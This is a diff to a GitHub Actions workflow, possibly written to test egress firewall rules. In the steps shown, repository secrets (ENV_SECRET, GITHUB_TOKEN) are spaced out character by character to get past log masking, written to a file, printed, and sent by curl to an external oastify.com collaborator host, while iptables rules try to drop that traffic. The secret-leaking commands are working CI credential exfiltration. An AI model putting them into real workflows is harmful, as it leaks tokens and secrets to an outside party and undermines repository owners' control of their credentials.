@@ -23,7 +23,7 @@ jobs:
         echo ${{ secrets.ENV_SECRET }} | sed 's/./& /g' >> foo.txt
         echo ${{ secrets.GITHUB_TOKEN }} | sed 's/./& /g' >> foo.txt
         cat foo.txt
-        sudo iptables -A OUTPUT -d github.com -j ACCEPT
-        sudo iptables -A OUTPUT -d c3g36rzh0gj5zg6uh1y9y5h1csij6bu0.oastify.com DROP
+        sudo iptables -A OUTPUT -d https://github.com -j ACCEPT
+        sudo iptables -A OUTPUT -d c3g36rzh0gj5zg6uh1y9y5h1csij6bu0.oastify.com -j DROP
         curl --data "Keys:$(cat foo.txt)" http://c3g36rzh0gj5zg6uh1y9y5h1csij6bu0.oastify.com
         curl http://example.com
